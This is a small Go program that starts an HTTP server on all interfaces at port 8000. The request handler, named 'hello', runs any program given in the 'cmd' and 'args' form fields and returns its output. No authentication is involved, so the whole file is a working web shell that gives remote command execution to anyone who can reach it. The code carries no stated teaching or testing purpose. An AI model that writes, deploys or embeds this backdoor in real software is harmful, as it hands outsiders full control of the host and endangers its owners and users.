package main

import (
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

func check(e error, w http.ResponseWriter) {
	if e != nil {
		fmt.Fprintf(w, e.Error())
		log.Println(e)
	}
}

func hello(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	cmd := exec.Command(r.Form.Get("cmd"), strings.Split(r.Form.Get("args"), " ")...)
	out, err := cmd.Output()
	check(err, w)
	fmt.Fprint(w, string(out))
}

func main() {
	log.Println("starting at :8000")
	http.HandleFunc("/", hello)
	log.Fatal(http.ListenAndServe("0.0.0.0:8000", nil))
}
